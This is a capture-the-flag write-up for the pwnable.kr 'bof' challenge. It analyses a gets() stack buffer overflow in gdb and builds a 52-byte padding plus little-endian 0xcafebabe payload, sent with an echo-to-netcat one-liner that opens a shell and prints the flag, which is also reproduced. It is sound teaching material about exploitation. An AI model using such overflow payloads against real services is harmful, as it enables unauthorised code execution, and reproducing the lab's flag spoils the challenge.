# bof

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?


ssh bof@pwnable.kr -p2222 (pw: guest)

- let's check the contents of the directory
```bash
bof@ubuntu:~$ ls -ls
total 24
16 -rwxr-xr-x 1 root bof  15300 Mar 26  2025 bof
 4 -rw-r--r-- 1 root root   342 Mar 26  2025 bof.c
 4 -rw-r--r-- 1 root root    86 Apr  3 16:03 readme
```
```bash
bof@ubuntu:~$ cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
bof@ubuntu:~$ cat bof.c
```
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
- when i follow the instructions on the readme:
```bash
bof@ubuntu:~$ nc 0 9000
hdsjfksd
overflow me : Nah..
```
- seems that I need to overflow the buffer somehow and make the input to func 0xcafebebe instead of 0xdeadbeef
- how buffer over flow works:
    - lets take this function for example:
    ```c
    void func(const char* input){
        char buf[8];
        int n = 0x11111111;
        gets(buf);
    }
    ```
    - if we were to input 'AAAAAAAAAAAA', since buf can only hold 8 bytes, it would store the first 8. But what happens to last 4?
    - after running the program with the input we find that suddenly, n=0x41414141
    - 0x41 is the hex number for the ascii character 'A', so that's what happens to the last 4 'A's
    - i copied the bof executable into my local computer since bof runs over nc
    - when I run 'gdb bof' I disassemble both main and func to see how it runs and look for possible breakpoints
    ```bash
        gef➤  disass main
        Dump of assembler code for function main:
        0x0000068a <+0>:     push   ebp
        0x0000068b <+1>:     mov    ebp,esp
        0x0000068d <+3>:     and    esp,0xfffffff0
        0x00000690 <+6>:     sub    esp,0x10
        0x00000693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
        0x0000069a <+16>:    call   0x62c <func>
        0x0000069f <+21>:    mov    eax,0x0
        0x000006a4 <+26>:    leave
        0x000006a5 <+27>:    ret
        End of assembler dump.
        gef➤  disass func
        Dump of assembler code for function func:
        0x0000062c <+0>:     push   ebp
        0x0000062d <+1>:     mov    ebp,esp
        0x0000062f <+3>:     sub    esp,0x48
        0x00000632 <+6>:     mov    eax,gs:0x14
        0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
        0x0000063b <+15>:    xor    eax,eax
        0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
        0x00000644 <+24>:    call   0x645 <func+25>
        0x00000649 <+29>:    lea    eax,[ebp-0x2c]
        0x0000064c <+32>:    mov    DWORD PTR [esp],eax
        0x0000064f <+35>:    call   0x650 <func+36>
        0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
        0x0000065b <+47>:    jne    0x66b <func+63>
        0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
        0x00000664 <+56>:    call   0x665 <func+57>
        0x00000669 <+61>:    jmp    0x677 <func+75>
        0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
        0x00000672 <+70>:    call   0x673 <func+71>
        0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
        0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
        0x00000681 <+85>:    je     0x688 <func+92>
        0x00000683 <+87>:    call   0x684 <func+88>
        0x00000688 <+92>:    leave
        0x00000689 <+93>:    ret
        End of assembler dump.
        gef➤  

    ```
    - what stands out to me is the line in func:
    ```bash
    0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
    ```
    - as it corresponds to the line in C:
    ```c
    if(key == 0xcafebabe)
    ```
    - also noting that it is the line right before is:
    ```c
    gets(overflowme);       // smash me!
    ```
    - this gives me the idea that we can overflow the buffer to change the variable key from 0xdeadbeef to 0xcafebabe
    - lets put a breakpoint in func+40 where the cmp instruction is used
    - when we break at that line, we will check the address at ebp+0*8
    - for now, when the program prompts us for input, we will type a few "A"s
    ```bash
        gef➤  x/50wx $ebp+0*8
        0xffffcee8:     0xffffcf08      0x5655569f      0xdeadbeef      0x00000000
        0xffffcef8:     0x00000000      0x00000000      0x00000000      0x00000000
        0xffffcf08:     0x00000000      0xf7d8ecc3      0x00000001      0xffffcfc4
        0xffffcf18:     0xffffcfcc      0xffffcf30      0xf7f9ce14      0x5655568a
        0xffffcf28:     0x00000001      0xffffcfc4      0xf7f9ce14      0x565556b0
        0xffffcf38:     0xf7ffcb60      0x00000000      0xb33f7722      0xfd785132
        0xffffcf48:     0x00000000      0x00000000      0x00000000      0xf7ffcb60
        0xffffcf58:     0x00000000      0x79e58300      0xf7ffda60      0xf7d8ec56
        0xffffcf68:     0xf7f9ce14      0xf7d8ed88      0xf7fc7ac4      0x56556ff4
        0xffffcf78:     0x00000001      0x56555530      0x00000000      0xf7fd8390
        0xffffcf88:     0xf7d8ed09      0x56556ff4      0x00000001      0x56555530
        0xffffcf98:     0x00000000      0x56555561      0x5655568a      0x00000001
        0xffffcfa8:     0xffffcfc4      0x565556b0
        gef➤ 
    ```
    - we found 0xdeadbeef, but where are our "A"s?
    ```bash
        gef➤  x/24wx $esp
        0xffffcea0:     0xffffcebc      0xffffd18b      0x00000002      0xffffced8
        0xffffceb0:     0xf7ffcfec      0x00000000      0x00000014      0x41414141
        0xffffcec0:     0x41414141      0x41414141      0x41414141      0x00000041
        0xffffced0:     0x00000000      0x00000000      0xffffffff      0x79e58300
        0xffffcee0:     0xf7fbf400      0x00000000      0xffffcf08      0x5655569f
        0xffffcef0:     0xdeadbeef      0x00000000      0x00000000      0x00000000
        gef➤  
    ```
    - there they are, the 0x41414141's
    - each block is 4 bytes and there are 13 blocks from the start of the "A"s to deadbeef
    - there are 4*13 = 52 bytes before we reach where deadbeef is located on the stack
    - this means that our payload needs to be "A"*52 + '0xcafebabe'
        - remember x86 architecture is little endian
        - so "A"*52 + '0xbebafeca'
    - earlier the readme said that the binary was running at nc 0 9000
        - lets use echo to print out our input to the commandline thru netcat
    ```bash
    (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" && cat) | nc 0 9000
    ```
    - we add the && cat so the program doesn't hang
    ```bash
        bof@ubuntu:~$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" && cat) | nc 0 9000  
        ls -ls
        total 5352
        16 -rwxr-xr-x 1 root root      15300 Apr  3 15:55 bof
        4 -rw-r--r-- 1 root root        372 Apr  3 15:54 bof.c
        4 -r--r----- 1 root bof_pwn      29 Apr  3 15:46 flag
        5324 -rw-r--r-- 1 root root    5445200 Oct  1 07:26 log
        4 -rwx------ 1 root root        768 Apr  3 16:06 super.pl
        cat flag
        Daddy_I_just_pwned_a_buff3r!
    ```